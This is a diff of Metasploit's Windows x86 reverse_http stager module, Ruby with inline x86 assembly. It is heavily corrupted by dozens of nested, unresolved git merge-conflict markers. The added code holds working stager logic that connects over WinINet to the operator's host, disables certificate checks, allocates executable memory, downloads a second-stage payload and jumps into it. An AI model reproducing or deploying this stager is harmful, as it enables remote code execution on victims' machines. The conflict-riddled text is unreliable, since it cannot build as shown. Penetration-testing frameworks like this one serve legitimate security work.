@@ -12,6 +12,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> 4.11.2_release_pre-rails4
@@ -285,12 +286,22 @@ module Msf
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+require 'msf/core/payload/transport_config'
+require 'msf/core/payload/windows/block_api'
+require 'msf/core/payload/windows/exitfunk'
+require 'msf/core/payload/uuid/options'
+
+module Msf
+
+>>>>>>> origin/4.11.2_release_pre-rails4
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
 #
 ###
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -448,11 +459,16 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 module Payload::Windows::ReverseHttp
 
+=======
+module Payload::Windows::ReverseHttp
+
+>>>>>>> origin/4.11.2_release_pre-rails4
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
   include Msf::Payload::UUID::Options
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -564,12 +580,15 @@ module Msf
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
 
   #
   # Register reverse_http specific options
   #
   def initialize(*args)
     super
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 =======
@@ -735,6 +754,8 @@ module Msf
 =======
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
@@ -849,6 +870,7 @@ module Msf
   # Generate the first stage
   #
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> origin/pod/metasploit-windows.rb
@@ -1222,6 +1244,10 @@ module Payload::Windows::ReverseHttp
 >>>>>>> payload-generator.rb
   def generate(opts={})
     conf = {
+=======
+  def generate(opts={})
+    conf = {
+>>>>>>> origin/4.11.2_release_pre-rails4
       ssl:         opts[:ssl] || false,
       host:        datastore['LHOST'],
       port:        datastore['LPORT'],
@@ -1243,6 +1269,7 @@ module Payload::Windows::ReverseHttp
       conf[:url]        = generate_small_uri
     end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1346,6 +1373,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
     generate_reverse_http(conf)
   end
 
@@ -1652,6 +1681,13 @@ module Payload::Windows::ReverseHttp
     321
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+  end
+
+  #
+  # Generate the transport-specific configuration
+  #
+  def transport_config(opts={})
+    transport_config_reverse_http(opts)
   end
 
   #
@@ -2719,6 +2755,7 @@ module Payload::Windows::ReverseHttp
 
     http_open_flags = 0
     secure_flags = 0
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -7910,6 +7947,34 @@ module Payload::Windows::ReverseHttp
 
         execute_stage:
           ret                    ; dive into the stored stage address
+=======
+
+    if opts[:ssl]
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 | # INTERNET_FLAG_NO_UI
+        0x00800000 | # INTERNET_FLAG_SECURE
+        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 ) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+
+      secure_flags = (
+        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
+        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
+    else
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 ) # INTERNET_FLAG_NO_UI
+    end
+>>>>>>> origin/4.11.2_release_pre-rails4
 
         got_server_uri:
           pop edi
@@ -7967,6 +8032,7 @@ module Payload::Windows::ReverseHttp
 
     if opts[:exitfunk]
       asm << %Q^
+<<<<<<< HEAD
     failure:
       call exitfunk
       ^
@@ -7992,6 +8058,30 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 >>>>>>> origin/pod/metasploit-framework
+=======
+      internetopen:
+        push ebx               ; DWORD dwFlags
+        push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
+      call get_proxy_server
+        db "#{proxy_info}", 0x00
+      get_proxy_server:
+                               ; LPCTSTR lpszProxyName (via call)
+        push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+      ^
+    else
+      asm << %Q^
+      internetopen:
+        push ebx               ; DWORD dwFlags
+        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+        push ebx               ; LPCTSTR lpszProxyName (NULL)
+        push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+>>>>>>> origin/4.11.2_release_pre-rails4
       ^
     end
 
@@ -8157,6 +8247,7 @@ module Payload::Windows::ReverseHttp
       push ebx               ; temporary storage for bytes read count
       mov edi, esp           ; &bytesRead
 
+<<<<<<< HEAD
     download_more:
       push edi               ; &bytesRead
       push 8192              ; read length
@@ -8195,6 +8286,37 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> 4.11.2_release_pre-rails4
 >>>>>>> origin/pod/metasploit-excellent.mp3
+=======
+    if proxy_enabled && proxy_user
+      asm << %Q^
+        ; DWORD dwBufferLength (length of username)
+        push #{proxy_user.length}
+        call set_proxy_username
+      proxy_username:
+        db "#{proxy_user}",0x00
+      set_proxy_username:
+                             ; LPVOID lpBuffer (username from previous call)
+        push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
+        push esi             ; hConnection
+        push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
+    end
+
+    if proxy_enabled && proxy_pass
+      asm << %Q^
+        ; DWORD dwBufferLength (length of password)
+        push #{proxy_pass.length}
+        call set_proxy_password
+      proxy_password:
+        db "#{proxy_pass}",0x00
+      set_proxy_password:
+                             ; LPVOID lpBuffer (password from previous call)
+        push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
+        push esi             ; hConnection
+        push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+>>>>>>> origin/4.11.2_release_pre-rails4
       ^
     end
 
@@ -8450,6 +8572,7 @@ module Payload::Windows::ReverseHttp
       send_request:
     ^
 <<<<<<< HEAD
+<<<<<<< HEAD
 
     if opts[:ssl]
       asm << %Q^
@@ -8592,6 +8715,11 @@ module Payload::Windows::ReverseHttp
 
     if opts[:ssl]
       asm << %Q^
+=======
+
+    if opts[:ssl]
+      asm << %Q^
+>>>>>>> origin/4.11.2_release_pre-rails4
       ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
       set_security_options:
         push 0x#{secure_flags.to_s(16)}
@@ -8603,6 +8731,7 @@ module Payload::Windows::ReverseHttp
         push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
         call ebp
       ^
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8683,6 +8812,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
     end
 
     asm << %Q^
@@ -8711,6 +8842,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8730,6 +8862,8 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 >>>>>>> 4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
     ^
 
     if opts[:exitfunk]
@@ -8742,6 +8876,7 @@ module Payload::Windows::ReverseHttp
     failure:
       push 0x56A2B5F0        ; hardcoded to exitprocess for size
       call ebp
+<<<<<<< HEAD
 <<<<<<< HEAD
       ^
     end
@@ -9061,21 +9196,60 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
       ^
+    end
 
-      if opts[:exitfunk]
-        asm << %Q^
-          failure:
-            call exitfunk
-          ^
-      else
-        asm << %Q^
-          failure:
-            push 0x56A2B5F0        ; hardcoded to exitprocess for size
-            call ebp
-          ^
-      end
+    asm << %Q^
+    allocate_memory:
+      push 0x40              ; PAGE_EXECUTE_READWRITE
+      push 0x1000            ; MEM_COMMIT
+      push 0x00400000        ; Stage allocation (4Mb ought to do us)
+      push ebx               ; NULL as we dont care where the allocation is
+      push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
+    download_prep:
+      xchg eax, ebx          ; place the allocated base address in ebx
+      push ebx               ; store a copy of the stage base address on the stack
+      push ebx               ; temporary storage for bytes read count
+      mov edi, esp           ; &bytesRead
+
+    download_more:
+      push edi               ; &bytesRead
+      push 8192              ; read length
+      push ebx               ; buffer
+      push esi               ; hRequest
+      push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
+      call ebp
+
+      test eax,eax           ; download failed? (optional?)
+      jz failure
+
+      mov eax, [edi]
+      add ebx, eax           ; buffer += bytes_received
+
+      test eax,eax           ; optional?
+      jnz download_more      ; continue until it returns 0
+      pop eax                ; clear the temporary storage
+
+    execute_stage:
+      ret                    ; dive into the stored stage address
+
+    got_server_uri:
+      pop edi
+      call got_server_host
+
+    server_host:
+      db "#{opts[:host]}", 0x00
+    ^
+
+    if opts[:exitfunk]
+      asm << asm_exitfunk(opts)
+    end
+
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-api/_index.html
 =======
@@ -9319,6 +9493,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
     asm
   end
 
@@ -9347,6 +9523,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
@@ -9522,6 +9699,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
 end
 
 end
